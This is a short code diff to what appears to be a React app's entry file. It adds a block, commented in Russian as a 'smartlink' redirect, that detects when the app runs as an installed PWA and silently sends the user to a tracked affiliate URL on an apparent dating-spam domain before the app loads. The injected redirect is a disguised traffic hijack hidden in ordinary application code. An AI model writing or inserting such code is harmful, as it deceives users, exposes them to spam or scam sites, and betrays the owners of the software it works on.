@@ -1,3 +1,10 @@
+// Редирект на смартлинк при запуске как PWA
+if (
+  window.matchMedia('(display-mode: standalone)').matches ||
+  (window.navigator as any).standalone
+) {
+  window.location.replace('https://llqrbo.sweets4datings.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=220791&s2=2027339');
+}
 import { createRoot } from 'react-dom/client'
 import App from './App.tsx'
 import './index.css'
